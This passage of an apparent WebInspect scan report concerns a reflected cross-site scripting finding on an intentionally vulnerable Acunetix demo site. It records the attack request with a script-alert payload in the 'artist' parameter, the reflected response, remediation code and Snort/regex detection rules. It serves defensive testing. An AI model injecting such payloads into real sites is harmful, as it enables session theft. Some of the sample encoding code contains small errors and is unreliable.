X-Scan-Memo: Category="Audit.Attack";SID="AB36F37D0A625B14AD80D876FD4297C7";PSID="38C2DF700D469FDA5789DFC101252DA0";SessionType="AuditAttack";CrawlType="None";AttackType="QueryParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="29";AttackParamDesc="artist";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2534%2532%2532%2531%2537%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="42";tt="40";
X-RequestManager-Memo: sid="33";smi="0";sc="1";ID="0c6f59b1";
X-Request-Memo: ID="19daed50";sc="1";tid="42";
Cookie: CustomCookie=WebInspect0

]]></AttackHTTPRequest><VulnerabilityID>5649</VulnerabilityID><Severity>4</Severity><Name>Cross-Site Scripting</Name><Classifications><Classification kind="CWE" identifier="CWE-80" href="http://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</Classification><Classification kind="7PK" identifier="Input Validation and Representation" href="https://vulncat.fortify.com/">Input Validation and Representation</Classification><Classification kind="7PK Category" identifier="Cross-Site Scripting: Reflected" href="https://vulncat.fortify.com/">Cross-Site Scripting: Reflected</Classification></Classifications><DetectionSelection><Location offset="2411" length="29" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[<drc_fortify /><hp-img src="xss.rgc" /><br /><drc_xssrf />A Cross-Site Scripting (XSS) vulnerability was detected in the web application. Cross-Site Scripting occurs when dynamically generated web pages display user input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. In this instance, the web application was vulnerable to an automatic payload, meaning the user simply has to visit a page to make the malicious scripts execute. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on end user systems. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />
Cross-Site Scripting(XSS) happens when user input from a web client is immediately included via server-side scripts in a dynamically generated web page. Reflected XSS is specifically considered critical when malicious payload can be embedded in a URL (e.g. in query strings of GET requests). An attacker can trick a victim, via phishing attack, to click on a link with vulnerable input which has been altered to include attack code and then sent to the legitimate server. The injected code is then reflected back to the user's browser which executes it. <br /><br />

The implications of successful Cross-Site Scripting attacks are:

<ul><li>Account hijacking -  An attacker can hijack the user's session before the session cookie expires and take actions with the privileges of the user who accessed the URL, such as issuing database queries and viewing the results. </li><li>Malicious script execution - Users can unknowingly execute JavaScript, VBScript, ActiveX, HTML, or even Flash content that has been inserted into a dynamically generated page by an attacker. 

</li><li>Worm propagation - With Ajax applications, XSS can propagate somewhat like a virus. The XSS payload can autonomously inject itself into pages, and easily re-inject the same host with more XSS, all of which can be done with no hard refresh. Thus, XSS can send multiple requests using complex HTTP methods to propagate itself invisibly to the user.
</li><li>Information theft - Via redirection and fake sites, attackers can connect users to a malicious server of the attacker's choice and capture any information entered by the user.</li><li>	Denial of Service - Often by utilizing malformed display requests on sites that contain a Cross-Site Scripting vulnerability, attackers can cause a denial of service condition to occur by causing the host site to query itself repeatedly . </li><li>Browser Redirection - On certain types of sites that use frames, a user can be made to think that he is in fact on the original site when he has been redirected to a malicious one, since the URL in the browser's address bar will remains the same. This is because the entire page isn't being redirected, just the frame in which the JavaScript is being executed is redirected. </li><li>	Manipulation of user settings - Attackers can change user settings for nefarious purposes. </li><li>Bypass Content-Security-Policy protection  -  Attackers can inject a malformed tag formation, known as dangling tag injection, which in some cases allows injected script to reuse valid nonce on the page and bypass script source restriction. Additionally dangling tag injection can be used to steal sensitive information embedded in HTML response if browser is able to make a request to the injected link. </li><li>Base tag injection: Attacker can cause relative links on a page to load from a different domain by modifying the base URL for the page via base tag injection.</li><li>Link prefetch injection: While unable to execute script, attackers can use link tag with rel=prefetch that will make browsers pre-fetch the specified link even though it is never rendered and rejected subsequently due to web application enforced cross-site policy (e.g. CSP protections).</li><li>Edge side includes (ESI) Injection - ESI  is a markup language used in various HTTP devices, such as reverse proxies and load balancers, that are positioned between client and server.  An attacker can inject ESI markup to perform critical attacks such as cross-site scripting and HTTPOnly cookie protection bypass. </li></ul>]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />

View the attack string included with the request to check what to search for in the response. For instance, if "(javascript:alert('XSS')"  is submitted as an attack (or another scripting language), it will also appear as part of the response.  This indicates that the web application is taking values from the HTTP request parameters and using them in the HTTP response without first removing potentially malicious data.


The response can be viewed in “Web Browser” view in the Vulnerability pane to see the injected popup events in action. Events requiring user interaction (e.g. onmouseover or onclick events) can be triggered by performing the corresponding action (e.g. clicking the injected link). 



Injection with numeric string in src, or href, attributes indicates that the site is vulnerable to script include or content exfiltration. These can be verified by repeating the request in a browser and intercepting originating network traffic in a web proxy.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Development:</b><br /><br />
Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. When validating user input, 

verify that it matches the strictest definition of valid input possible. For example, if a certain parameter is supposed to be a number, attempt 

to convert it to a numeric data type in your programming language. <br /><br /><b>PHP:</b> intval("0".$_GET['q']);   <br /><br /><b>ASP.NET:</b> 

int.TryParse(Request.QueryString["q"], out val); <br /><br />

The same applies to date and time values, or anything that can be converted to a stricter type before being used. When accepting other types of 

text input, make sure the value matches either a list of acceptable values (white-listing), or a strict regular expression. If at any point the 

value appears invalid, do not accept it. Also, do not attempt to return the value to the user in an error message. <br /><br />

Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. 

These should be used to sanitize all input before it is displayed to the client. <br /><br /><b>PHP:</b>  string htmlspecialchars (string string 

[, int quote_style])<br /><br /><b>ASP.NET:</b> Server.HTMLEncode (strHTML String)



<br /><br />

When reflecting values into JavaScript or another format, make sure to use a type of encoding that is appropriate. Encoding data for HTML is not 

sufficient when it is reflected inside of a script or style sheet. For example, when reflecting data in a JavaScript string, make sure to encode 

all non-alphanumeric characters using hex (\xHH) encoding.<br /><br />

If you have JavaScript on your page that accesses unsafe information (like location.href) and writes it to the page (either with document.write, 

or by modifying a DOM element), make sure you encode data for HTML before writing it to the page. JavaScript does not have a built-in function to 

do this, but many frameworks do. If you are lacking an available function, something like the following will handle most cases:<br /><br />

s = s.replace(/&amp;/g,'&amp;amp;').replace(/"/i,'&amp;quot;').replace(/&lt;/i,'&amp;lt;').replace(/&gt;/i,'&amp;gt;').replace(/'/i,'&amp;apos;')


<br /><br />

Ensure that you are always using the right approach at the right time. Validating user input should be done as soon as it is received. Encoding 

data for display should be done immediately before displaying it.

<b><br /><br />


For Security Operations:</b><br /><br />

Server-side encoding, where all dynamic content is first sent through an encoding function where Scripting tags will be replaced with codes in the 

selected character set, can help to prevent Cross-Site Scripting attacks. <br /><br />

Many web application platforms and frameworks have some built-in support for preventing Cross-Site Scripting. Make sure that any built-in 

protection is enabled for your platform. In some cases, a misconfiguration could allow Cross-Site Scripting. In ASP.NET, if a page's 

EnableViewStateMac property is set to False, the ASP.NET view state can be used as a vector for Cross-Site Scripting. <br /><br />

An IDS or IPS can also be used to detect or filter out XSS attacks. Below are a few regular expressions that will help detect Cross-Site 

Scripting. <br /><br /><b>Regex for a simple XSS attack:</b><br />
/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/ix <br /><br />

The above regular expression would be added into a new Snort rule as follows: <br /><br />

alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"NII Cross-Site Scripting attempt"; flow:to_server,established; 

pcre:"/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/i"; classtype:Web-application-attack; sid:9000; rev:5;) <br /><br /><b>Paranoid regex for 

XSS attacks:</b><br />
/((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/I <br /><br />

This signature simply looks for the opening HTML tag, and its hex equivalent, followed by one or more characters other than the new line, and then 

followed by the closing tag or its hex equivalent. This may end up giving a few false positives depending upon how your web application and web 

server are structured, but it is guaranteed to catch anything that even remotely resembles a Cross-Site Scripting attack.

<br /><br /><b>For QA:</b><br /><br />


Fixes for Cross-Site Scripting defects will ultimately require code based fixes. Read the the following links for more information 

about manually testing your application for Cross-Site Scripting.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><br /><b>OWASP Cross-Site Scripting Information</b><br /><a href="https://www.owasp.org/index.php/XSS">https://www.owasp.org/index.php/XSS</a><br /><br /><b>CERT</b><br /><a href="http://www.cert.org/advisories/CA-2000-02.html">http://www.cert.org/advisories/CA-2000-02.html</a><br /><br /><b>Apache</b><br /><a href="http://httpd.apache.org/info/css-security/apache_specific.html">http://httpd.apache.org/info/css-security/apache_specific.html</a><br /><br /><b>SecurityFocus.com</b><br /><a href="http://www.securityfocus.com/infocus/1768 ">http://www.securityfocus.com/infocus/1768 </a>]]></SectionText></ReportSection><ReportSection><Name>Description</Name><SectionText><![CDATA[Cross-Site Scripting occurs when dynamically generated web pages display input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, utilizing client-side validation of user supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Impact Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Impact Description</Name><SectionText><![CDATA[When successfully exploited, Cross-Site Scripting gives an attacker a method of taking control of the interaction between a user and a web site. On a simple site composed of static content, this might only lead to changing how pages display to a specific user. When the site is capable of accepting user input, such as login information, or allows users to make choices with real world implications such as transferring funds or accessing private data, Cross-Site Scripting presents its most serious threat. The most significant danger from a successful Cross-Site Scripting attack is that an attacker will be able to emulate the credentials of an actual user by gaining access to a user’s session cookie, thereby hijacking the user session and taking over the account. The FDIC has recently indicated that unauthorized access to checking accounts is the fastest growing form of identity theft. More often than not, these instances of account hijacking are due to the presence of Cross-site scripting vulnerabilities. When an attacker gains control on the user’s end, it then often becomes unnecessary to break into the server. By that point, he already has the means to acquire the information he needs.]]></SectionText></ReportSection><ReportSection><Name>Probability Score</Name><SectionText><![CDATA[Critical]]></SectionText></ReportSection><ReportSection><Name>Probability Description</Name><SectionText><![CDATA[To carry out a Cross-Site Scripting attack, an attacker will create a URL that takes advantage of a Cross-Site Scripting flaw. The attacker must then find some way of getting a victim to visit this URL. This can be done in many ways, ranging from getting it listed in a search engine to exploiting weaknesses in mail clients that allow scripted content to be executed. Once the victim has used the Cross-Site Scripting URL, the attacker's malicious code will be executed on his or her system.  In other words, there is a lot of effort required up-front for these attacks to be successful.  However, the potential payoff makes that effort worthwhile more often than not.]]></SectionText></ReportSection><ReportSection><Name>Risk Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Risk Description</Name><SectionText><![CDATA[This vulnerability should be addressed quickly, especially if the application is already in production.]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. Validation can be done using standard ASP.NET Validation controls, or directly in your code. Do not attempt to sanitize input by removing script strings or characters, simply reject it. Always use as strict a pattern as you can possibly allow.<br /><br />
Encoding of output insures that any scriptable content is properly encoded for HTML before being sent to the client. This is done with the function HttpUtility.HtmlEncode, as shown in the following Label control sample:<br /><br />
	Label2.Text = HttpUtility.HtmlEncode(input)
<br /><br />Be sure to consider all paths that user input takes through your application. For instance, if data is entered by the user, stored in a database, and then redisplayed later, you must make sure it is properly encoded each time it is retrieved.If you must allow free-format text input, such as in a message board, and you wish to allow some HTML formatting to be used, you can handle this safely by explicitly allowing only a small list of safe tags. Here is an example of how to do this safely:<br /><br />
C# Example:<br /><br />
            StringBuilder sb = new StringBuilder(<br />
                HttpUtility.HtmlEncode(input)); <br />
            sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;"); <br />
            sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;"); <br />
            Response.Write(sb.ToString());<br /><br />

VB.NET Example: <br /><br />
        Dim sb As StringBuilder = New StringBuilder( _ <br />
                HttpUtility.HtmlEncode(input)) <br />
        sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;") <br />
        sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;") <br />
        Response.Write(sb.ToString())<br /><br />

The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure what is being returned is what is expected, and is valid. </li><li>Use client-side validation when adding extra functionality to user input checking in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered " &lt;script&gt;alertdocumentcookie( 'aaa') &lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response, so that they cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms as opposed to single-factor authentication. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the web, or given to you by an acquaintance) for use in your own code. </li></ul>
Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. These should be used to sanitize all input before displayed to the client. 
<br /><br />
ASP / ASP.NET: Server.HTMLEncode (strHTML String)<br /><br />]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[<br />The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the Web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure the data being returned is what is expected, and is valid. </li><li>When adding extra functionality to user-input checking, use client-side validation in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user-supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered "&lt;script&gt;alertdocumentcookie('aaa')&lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response. Encoding ensures that the characters cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms, such as requiring a token and password, as opposed to single-factor authentication, such as requiring only a password. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the Web or given to you by an acquaintance) for use in your own code. </li></ul>
The Java language does not have a built-in method to convert the value of the input variable into correct, non-interpretable HTML. The following code samples show two different ways of writing a utility method to sanitize all user input before displaying it back to the client. <br /><br /><br />
public static String HTMLEncode(String aTagFragment){ <br /><br />
  //make sure you replace &amp; first<br />
  aTagFragment = aTagFragment.replaceAll("&amp;", "&amp;amp;"); <br />
  aTagFragment = aTagFragment.replaceAll("&lt;", "&amp;lt;"); <br />
  aTagFragment = aTagFragment.replaceAll("&gt;", "&amp;gt;"); <br />
  aTagFragment = aTagFragment.replaceAll("\"", "&amp;quot;"); <br />
  aTagFragment = aTagFragment.replaceAll("'", "&amp;#39;"); <br />
  //replace backslash ‘\’ character<br />
  aTagFragment = aTagFragment.replaceAll("\\\\", "&amp;#92;"); <br /><br />
  return aTagFragment; <br />
}<br /><br />
public static String HTMLEncode(String aTagFragment){ <br />
  final StringBuffer result = new StringBuffer();<br />
  final StringCharacterIterator iterator = new StringCharacterIterator(aTagFragment); <br />
  char character = iterator.current();<br />
  while (character != StringCharacterIterator.DONE ){ <br />
   		if (character == '&lt;') { <br />
   			result.append("&amp;lt;"); <br />
   		} <br />
   		else if (character == '&gt;') { <br />
   			result.append("&amp;gt;"); <br />
   		} <br />
   		else if (character == '\"') { <br />
   			result.append("&amp;quot;"); <br />
   		} <br />
   		else if (character == '\'") { <br />
   			result.append("&amp;#39;"); <br />
   		} <br />
   		else if (character == '\\') { <br />
   			result.append("&amp;#92;"); <br />
   		} <br />
   		else if (character == '&amp;') { <br />
   			result.append("&amp;amp;"); <br />
   		} <br />
   		else { <br />
   			//the char is not a special one <br />
   			//add it to the result as is <br />
   			result.append(character); <br />
   		} <br />
   		character = iterator.next();<br />
   	} <br />
   	return result.toString();<br />
}]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection></Issue></Issues><RawRequest id="AB36F37D0A625B14AD80D876FD4297C7"><![CDATA[GET /listproducts.php?artist=%3csCrIpT%3ealert(42217)%3c%2fsCrIpT%3e HTTP/1.1
Referer: http://php.vulnweb.com/artists.php?artist=1
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="AB36F37D0A625B14AD80D876FD4297C7";PSID="38C2DF700D469FDA5789DFC101252DA0";SessionType="AuditAttack";CrawlType="None";AttackType="QueryParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="29";AttackParamDesc="artist";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2534%2532%2532%2531%2537%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="42";tt="40";
X-RequestManager-Memo: sid="33";smi="0";sc="1";ID="0c6f59b1";
X-Request-Memo: ID="19daed50";sc="1";tid="42";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:48:53 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 5005

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>pictures</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '=<sCrIpT>alert(42217)</sCrIpT>' at line 1
Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/listproducts.php on line 74
</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="AB36F37D0A625B14AD80D876FD4297C7"><Method>GET</Method><Path>/</Path><File>listproducts</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery>artist=%3csCrIpT%3ealert(42217)%3c%2fsCrIpT%3e</FullQuery><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries><Query><Name>artist</Name><Value>%3csCrIpT%3ealert(42217)%3c%2fsCrIpT%3e</Value></Query></Queries><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/artists.php?artist=1</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="AB36F37D0A625B14AD80D876FD4297C7";PSID="38C2DF700D469FDA5789DFC101252DA0";SessionType="AuditAttack";CrawlType="None";AttackType="QueryParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="29";AttackParamDesc="artist";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2534%2532%2532%2531%2537%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="42";tt="40";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="33";smi="0";sc="1";ID="0c6f59b1";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="19daed50";sc="1";tid="42";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>pictures</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '=<sCrIpT>alert(42217)</sCrIpT>' at line 1
Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/listproducts.php on line 74
</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
